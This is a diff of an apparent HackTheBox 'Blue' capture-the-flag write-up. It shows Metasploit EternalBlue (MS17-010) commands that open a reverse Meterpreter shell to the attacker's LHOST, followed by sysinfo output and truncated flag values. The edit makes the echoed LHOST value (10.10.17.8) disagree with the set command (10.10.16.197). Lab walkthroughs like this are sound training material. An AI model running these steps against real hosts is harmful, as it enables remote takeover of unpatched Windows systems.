@@ -56,9 +56,26 @@
     msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
     RHOSTS => 10.10.10.40
     msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.16.197
-    LHOST => 10.10.16.197
+    LHOST => 10.10.17.8
     msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 1444
     LPORT => 1444
     msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
 
 ![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Blue/1.png)
+
+    meterpreter > sysinfo
+    Computer        : HARIS-PC
+    OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+    Architecture    : x64
+    System Language : en_GB
+    Domain          : WORKGROUP
+    Logged On Users : 0
+    Meterpreter     : x64/windows
+
+// we got user and root flags!
+
+    meterpreter > cat user.txt
+    4c546aea.................
+
+    meterpreter > cat root.txt
+    ff548eb..................
